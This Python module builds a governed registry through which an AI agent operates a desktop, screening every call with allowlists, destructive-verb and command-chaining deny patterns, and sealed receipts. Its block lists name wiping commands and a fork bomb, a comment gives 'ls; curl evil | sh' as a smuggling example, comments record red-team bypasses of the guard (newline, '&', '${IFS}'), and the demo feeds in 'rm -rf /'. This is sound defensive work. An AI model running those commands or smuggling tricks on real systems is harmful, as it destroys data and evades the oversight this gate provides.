"""desktop_access: one governed action registry, exposed through all three AI access points.

An AI can operate a desktop three ways (cheapest + most reliable first):
  1. ACTION API / MCP  -- the AI calls a named verb (open_app, run_allowed_command) directly.
  2. DOM / accessibility -- the AI clicks the real element by selector + ARIA role/label.
  3. PIXELS / set-of-marks -- the AI picks a numbered mark overlaid on a screenshot.

This is the SCBE control plane: ONE registry of typed, allowlist-classed actions, surfaced all
three ways off the same definitions, so the same action is reachable as a verb, a selector, or a
mark. EVERY invocation goes through the allowlist (safe / guarded / denied) + a destructive-command
screen (the never-delete rule, in-system) and emits a SHA-256 sealed receipt. The reliable channel
(the action API) is what should actually drive your own apps; DOM and pixels are for surfaces you
did not instrument (un-wired apps, then canvas/emulator regions).

Governance honesty -- what the gate actually checks, on EVERY string param (not just one):
  * SCOPE     -- a path under a system root (Windows/System32/Program Files/etc) or a broad/root scope
                 (a bare drive, c:/users, the onedrive root, ~, /) is REFUSED outright (the scope guards
                 reused from blocks.py). It does NOT blanket-refuse a write to a specific file inside your
                 own folders (that would break saving your work) -- those still pass the confirm gate.
  * VERB      -- destructive verbs (rm -rf, Remove-Item, rd /s, del PATH, erase, format, mkfs, sdelete,
                 dd if=, os.remove, shutil.rmtree, DROP/TRUNCATE TABLE, wipe...) are REFUSED, confirm
                 never overrides. Covers Windows/PowerShell natives, not just POSIX.
  * CHAINING  -- ; | || && ` $( and redirects are refused (a benign head command can't smuggle a tail
                 past a head-only allowlist).
  * L13       -- the SCBE intent gate is layered on the combined text if importable; if NOT importable it
                 is recorded as 'unavailable' (fail-open is not laundered into a clean ALLOW), and the
                 deterministic scope/verb/chaining screens stand alone.
The receipt is a FORWARD-CHAINED SHA-256 seal: tamper-evident WITHIN this process (reorder/insert/delete/
rewrite all break verify()). It is not a durable cross-process audit -- persist the transcript + nonce for
that. The L13 score is a heuristic, not a proof of safety; the seal is tamper-evidence, not proof.

    from python.scbe.desktop_access import default_registry
    reg = default_registry()
    reg.invoke("open_app", {"app": "terminal"})       # the verb channel (governed + sealed)
    reg.access_points("open_app")                      # the same action, all three ways
"""

from __future__ import annotations

import copy
import hashlib
import json
import os
import re
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Sequence

from .blocks import _is_broad_scope, _is_system_path  # the scope guards (reused, not reinvented)

# destructive verbs refused outright, no confirm overrides (the never-delete rule). Covers POSIX,
# Windows/PowerShell-native (the user's actual platform), Python, and SQL forms -- the narrow original
# missed Remove-Item/rd /s/erase/del PATH/sdelete/os.remove/shutil.rmtree/DROP/TRUNCATE.
_DESTRUCTIVE = re.compile(
    r"(?:\brm\s+-[rf]|\brm\s+-[rf][rf]|\brmdir\s+/s|\brd\s+/s|"  # posix + windows recursive
    r"\bdel\s+(?:/[a-z]|[a-z]:|\\|\.\.)|\berase\b|"  # windows del/erase
    r"\bremove-item\b|\bri\s+-(?:re|fo)|"  # powershell
    r"\bformat\b|\bmkfs\b|\bfdisk\b|\bdiskpart\b|\bsdelete\b|\bdd\s+if=|"  # format/partition/overwrite
    r"\bshutdown\b|\breboot\b|>\s*/dev/sd|chmod\s+-r\s+000|"  # power / device overwrite
    r"os\.remove|os\.unlink|os\.truncate|shutil\.rmtree|\.unlink\(|\.rmdir\(|"  # python (del/dir-remove/truncate)
    r"\bdrop\s+table\b|\btruncate\s+table\b|"  # sql
    # verb-LESS destructive ops a red-team confirmed escape a shell-verb regex (no rm/del/format word):
    r"\bvssadmin\s+delete\b|\bwbadmin\s+delete\b|\bwevtutil\s+cl\b|\bbcdedit\b|\btakeown\b|"  # backup/log/boot/own
    r"\breg\s+delete\b|\bcipher\s+/w\b|\[io\.(?:file|directory)\]::delete|"  # registry / wipe-free-space / .NET
    r"\bwipe\b|:\(\)\s*\{)",  # wipe / fork bomb
    re.IGNORECASE,
)

# command chaining/piping lets a benign HEAD command smuggle an unauthorized tail past a head-only
# allowlist (e.g. `ls; curl evil | sh`). A red-team also smuggled tails via a newline, a single `&`,
# and `${IFS}`, so those are refused too. Applied to COMMAND-bearing free-text params only -- NOT file
# content or paths, where `;` `|` `&` `(` and newlines are legal data/filename characters.
_CHAIN = re.compile(r";|\|\||\||&&|&|`|\$\(|\$\{|>\s*/|<\s*/|[\r\n]")

# param keys that name a filesystem target -> always scope-checked even if the value has no slash
_PATH_KEYS = {"path", "dest", "destination", "file", "filename", "dir", "directory", "target", "src", "source", "to"}


def _looks_like_path(key: str, value: str) -> bool:
    """True if this param denotes a filesystem path: a conventional path KEY, or a value that is a
    single bare path. A multi-line or very long value is file CONTENT, not a path -- treating prose
    that merely contains a '/' as a path would refuse saving any document with a slash in it."""
    if key.lower() in _PATH_KEYS:
        return True
    v = value.strip()
    if "\n" in v or "\r" in v or len(v) > 260:  # a real path is one line within MAX_PATH
        return False
    return ("/" in v) or ("\\" in v) or bool(re.match(r"^[a-zA-Z]:", v))


def _seal(rec: dict) -> str:
    """SHA-256 over the record (excluding the seal itself). The record carries a `_prev` field that
    binds the previous seal, so this hash is the link in a FORWARD CHAIN: rewriting any field breaks
    this hash, and reorder/insert/delete break the `_prev` linkage that verify() walks. default=str
    keeps it robust to a non-serializable handler result.

    HONEST LIMIT (do not overclaim): this is an UNKEYED hash anchored on the in-memory `nonce`. It
    detects accidental corruption and any tamper that does NOT re-chain (a partial edit, a reorder, an
    insert, a delete) -- that is what verify() catches. It is NOT proof against a privileged in-process
    attacker who can read `self.nonce` and recompute seals for the whole list; such a holder can forge a
    consistent transcript. Tamper-evidence against the host needs the head seal anchored in an external
    append-only sink, or an HMAC keyed by a secret the host never holds. This is integrity, not custody."""
    body = {k: v for k, v in rec.items() if k != "seal"}
    return hashlib.sha256(
        json.dumps(body, sort_keys=True, separators=(",", ":"), default=str).encode("utf-8")
    ).hexdigest()


def _gate(text: str) -> Optional[str]:
    """Best-effort SCBE L13 intent gate over free-text; None if the gate is not importable."""
    for mod in ("scbe_aethermoore", "src.scbe_aethermoore"):
        try:
            scan = __import__(mod, fromlist=["scan"]).scan
            return scan(text)["decision"]
        except Exception:
            continue
    return None


@dataclass(frozen=True)
class Action:
    """One desktop action, defined once and surfaced through all three access points."""

    name: str
    summary: str
    params: Dict[str, str]  # param name -> type ("string"/"int")
    safety: str  # "safe" | "guarded" | "denied"
    selector: str  # DOM selector for the structure channel
    role: str  # ARIA role
    label: str  # ARIA / accessible name
    handler: Callable[[Dict[str, Any]], Any]
    text_param: Optional[str] = None  # which param carries free text to gate (e.g. a command)


@dataclass
class ActionRegistry:
    actions: Dict[str, Action] = field(default_factory=dict)
    transcript: List[dict] = field(default_factory=list)
    nonce: str = field(default_factory=lambda: hashlib.sha256(os.urandom(16)).hexdigest()[:16])

    def register(self, action: Action) -> None:
        self.actions[action.name] = action

    # --- access point 1: the verb / action API (governed + sealed) ---------------
    def invoke(self, name: str, params: Optional[Dict[str, Any]] = None, confirm: Optional[str] = None) -> dict:
        params = params or {}
        action = self.actions.get(name)
        # deep-copy so a caller cannot mutate the recorded params after they are sealed
        rec: dict = {
            "hop": len(self.transcript) + 1,
            "action": name,
            "params": copy.deepcopy(params),
            "decision": "",
            "result": "",
        }
        if confirm:
            rec["confirm"] = str(confirm)  # record WHAT was approved (so the audit can show it)
        # The DETERMINISTIC screens are scoped by what each param IS, so the gate stays a wall without
        # refusing legitimate data (a confirmed bypass was that ONLY the text_param was screened, so a
        # destructive PATH slipped through; the over-correction of screening EVERY param would refuse a
        # file whose CONTENT merely contains a newline or the word "rm"). The split:
        #   * SCOPE (protected/broad target): every path-bearing param -- the never-delete wall.
        #   * DESTRUCTIVE verb: path-bearing params + the command field (catches `path="x; rm -rf /"`).
        #   * CHAINING (; | & ( newline ...): the command field ONLY -- those are legal in filenames and
        #     in file content, so they smuggle a tail only inside a shell-bound command string.
        # The L13 INTENT HEURISTIC runs only on the designated free-text field (it false-positives on
        # short structured values like a move id or an app name -- the deterministic screens cover those).
        strs = {k: v for k, v in params.items() if isinstance(v, str)}
        text_key = action.text_param if action else None
        text = str(params.get(text_key, "")) if text_key else ""
        gate = _gate(text) if text.strip() else None
        rec["l13"] = "consulted" if gate is not None else ("n/a" if not text.strip() else "unavailable")
        scoped = [v for k, v in strs.items() if _looks_like_path(k, v) and (_is_broad_scope(v) or _is_system_path(v))]
        destructive = [
            v for k, v in strs.items() if (k.lower() in _PATH_KEYS or k == text_key) and _DESTRUCTIVE.search(v)
        ]
        chained = [v for k, v in strs.items() if k == text_key and _CHAIN.search(v)]
        if action is None:
            rec.update(decision="NO_ACTION", result="no action %r" % name)
        elif action.safety == "denied":
            rec.update(decision="DENIED", result="action %r is denied" % name)
        elif scoped:
            rec.update(decision="REFUSED", result="protected/broad scope (never-delete): %r" % scoped[0], gate=gate)
        elif destructive:
            rec.update(decision="REFUSED", result="destructive verb blocked: %r" % destructive[0], gate=gate)
        elif chained:
            rec.update(decision="REFUSED", result="command chaining/piping blocked: %r" % chained[0], gate=gate)
        elif gate in ("DENY", "ESCALATE"):
            rec.update(decision="REFUSED", result="L13 gate %s" % gate, gate=gate)
        elif action.safety == "guarded" and not confirm:
            rec.update(decision="NEEDS_CONFIRM", result="guarded action; pass confirm='<reason>'")
        else:
            try:  # a handler/executor raising must STILL be sealed + logged, not vanish
                rec.update(decision="ALLOWED", result=action.handler(params), gate=gate)
            except Exception as exc:
                rec.update(decision="ERROR", result="handler raised: %s: %s" % (type(exc).__name__, exc), gate=gate)
        # forward chain: bind the previous seal (anchored to a per-session nonce) INTO the record, then
        # seal. Rewrite breaks the per-record hash; reorder/insert/delete break the _prev linkage.
        rec["_prev"] = self.transcript[-1]["seal"] if self.transcript else self.nonce
        rec["seal"] = _seal(rec)
        self.transcript.append(rec)
        return rec

    def verify(self) -> bool:
        """Walk the forward chain from the session nonce: any reorder/insert/delete/rewrite that did not
        re-chain breaks it. NOTE this re-derives from the readable `self.nonce`, so it proves internal
        consistency + catches un-re-chained tampering -- it cannot detect a forger who re-chained the
        whole list (see _seal's HONEST LIMIT). True host-tamper-evidence needs an external anchor/HMAC."""
        prev = self.nonce
        for r in self.transcript:
            if r.get("seal") != _seal(r) or r.get("_prev") != prev:
                return False
            prev = r["seal"]
        return True

    # --- access point 1 (schema): MCP tools ---------------------------------------
    def mcp_tools(self) -> List[dict]:
        return [
            {
                "name": a.name,
                "description": a.summary,
                "safety": a.safety,
                "inputSchema": {
                    "type": "object",
                    "properties": {p: {"type": t} for p, t in a.params.items()},
                    "required": list(a.params),
                },
            }
            for a in self.actions.values()
            if a.safety != "denied"
        ]

    # --- access point 2: DOM / accessibility manifest -----------------------------
    def dom_manifest(self) -> Dict[str, dict]:
        return {a.name: {"selector": a.selector, "role": a.role, "label": a.label} for a in self.actions.values()}

    # --- access point 3: pixels / set-of-marks ------------------------------------
    def set_of_marks(self) -> List[dict]:
        return [
            {"mark": i, "action": a.name, "label": a.label, "selector": a.selector}
            for i, a in enumerate(self.actions.values(), start=1)
        ]

    # --- the unifying view: one action, all three access points -------------------
    def access_points(self, name: str) -> dict:
        a = self.actions[name]
        marks = {m["action"]: m["mark"] for m in self.set_of_marks()}
        return {
            "action": name,
            "verb": {"call": name, "params": list(a.params), "safety": a.safety},  # channel 1
            "dom": {"selector": a.selector, "role": a.role, "label": a.label},  # channel 2
            "pixels": {"mark": marks[name], "label": a.label},  # channel 3
        }


# --- a representative AetherDesk-style action set -------------------------------
_APPS = ["terminal", "files", "editor", "browser", "settings"]
_ALLOWED_CMDS = {"help", "apps", "ls", "pwd", "echo", "date", "whoami"}


def default_registry() -> ActionRegistry:
    reg = ActionRegistry()

    def list_apps(_p):
        return {"apps": _APPS}

    def open_app(p):
        app = p.get("app", "")
        return ("opened %s" % app) if app in _APPS else "no app %r" % app

    def list_windows(_p):
        return {"windows": []}

    def focus_window(p):
        return "focused window %s" % p.get("id", "")

    def run_allowed_command(p):
        cmd = str(p.get("command", "")).strip()
        head = cmd.split()[0] if cmd else ""
        return ("ran: %s" % cmd) if head in _ALLOWED_CMDS else "command %r not on the allowlist" % head

    def save_file(p):
        return "saved %s (%d bytes)" % (p.get("path", ""), len(str(p.get("content", ""))))

    def shutdown(_p):
        return "should never run"

    reg.register(Action("list_apps", "List installed apps", {}, "safe", "#start-menu", "list", "Start menu", list_apps))
    reg.register(
        Action(
            "open_app", "Open an app by name", {"app": "string"}, "safe", "[data-app]", "button", "App icon", open_app
        )
    )
    reg.register(Action("list_windows", "List open windows", {}, "safe", "#taskbar", "list", "Taskbar", list_windows))
    reg.register(
        Action(
            "focus_window",
            "Focus a window",
            {"id": "string"},
            "safe",
            "[data-win]",
            "button",
            "Window tab",
            focus_window,
        )
    )
    reg.register(
        Action(
            "run_allowed_command",
            "Run an allowlisted terminal command",
            {"command": "string"},
            "guarded",
            "#terminal-input",
            "textbox",
            "Terminal",
            run_allowed_command,
            text_param="command",
        )
    )
    reg.register(
        Action(
            "save_file",
            "Save content to a path",
            {"path": "string", "content": "string"},
            "guarded",
            "#save",
            "button",
            "Save",
            save_file,
            # no text_param: a file's CONTENT is opaque data (it may legitimately contain newlines, "|",
            # or the word "rm") -- save_file's protection is the SCOPE screen on `path`, not its content.
            text_param=None,
        )
    )
    reg.register(Action("shutdown", "Power off (denied)", {}, "denied", "#power", "button", "Power", shutdown))
    return reg


# --- access point 4: the Rubik's cube as the controller ------------------------
# Each face-turn SELECTS a desktop action; a twist sequence plays a sequence of governed,
# sealed actions. The cube steering wheel now steers the DESKTOP, not arithmetic -- so a human
# (or a speedcuber, or the AI) can "play" the cube to operate the desktop, every turn governed.
_MOVE_ACTION: Dict[str, tuple] = {
    "U": ("list_apps", {}),
    "R": ("open_app", {"app": "terminal"}),
    "F": ("list_windows", {}),
    "D": ("focus_window", {"id": "1"}),
    "L": ("save_file", {"path": "/note", "content": "hi"}),
    "B": ("run_allowed_command", {"command": "help"}),
}


def cube_moves() -> Dict[str, str]:
    """The cube controller map: face-turn -> desktop action."""
    return {m: name for m, (name, _) in _MOVE_ACTION.items()}


def play_cube(reg: ActionRegistry, twists: str, confirm: Optional[str] = None) -> dict:
    """Play a Singmaster twist sequence as DESKTOP actions through the governed registry."""
    hops: List[dict] = []
    for raw in twists.replace(",", " ").split():
        m = raw.strip().upper().rstrip("'")  # face letter; primes ignored for now
        if m not in _MOVE_ACTION:
            hops.append({"move": raw, "decision": "UNKNOWN_MOVE", "result": "no action on %r" % raw})
            continue
        name, params = _MOVE_ACTION[m]
        r = reg.invoke(name, params, confirm=confirm)
        hops.append({"move": raw, "action": name, "decision": r["decision"], "result": r["result"]})
    return {
        "twists": twists,
        "hops": hops,
        "sealed": reg.verify(),
        "route": " -> ".join("%s:%s" % (h["move"], h.get("action", "?")) for h in hops),
    }


def main(argv: Optional[Sequence[str]] = None) -> int:
    reg = default_registry()
    print("DESKTOP ACCESS  one registry, three access points  (%d actions)\n" % len(reg.actions))
    print("== access point 1: VERB / MCP (governed + sealed) ==")
    for name, params in [
        ("open_app", {"app": "terminal"}),
        ("run_allowed_command", {"command": "rm -rf /"}),
        (
            "run_allowed_command",
            {"command": "ls"},
        ),
        ("shutdown", {}),
    ]:
        r = reg.invoke(name, params if isinstance(params, dict) else {}, confirm="demo")
        print(
            "  %-20s -> %-13s %s"
            % (name + str(params if name == "run_allowed_command" else ""), r["decision"], r["result"])
        )
    print("  transcript sealed:", reg.verify())
    print("\n== access point 2: DOM manifest (sample) ==")
    print("  open_app ->", reg.dom_manifest()["open_app"])
    print("\n== access point 3: set-of-marks (sample) ==")
    print(" ", reg.set_of_marks()[:3])
    print("\n== the same action, all three ways ==")
    print("  open_app ->", json.dumps(reg.access_points("open_app")))
    print("\n== access point 4: the RUBIK'S CUBE as the controller ==")
    print("  cube map:", cube_moves())
    cr = play_cube(reg, "U R F B", confirm="cube turn")
    print("  play 'U R F B' ->", cr["route"])
    for h in cr["hops"]:
        print("    %-3s %-20s %-13s %s" % (h["move"], h.get("action", "-"), h["decision"], h["result"]))
    print("  transcript still sealed:", cr["sealed"])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
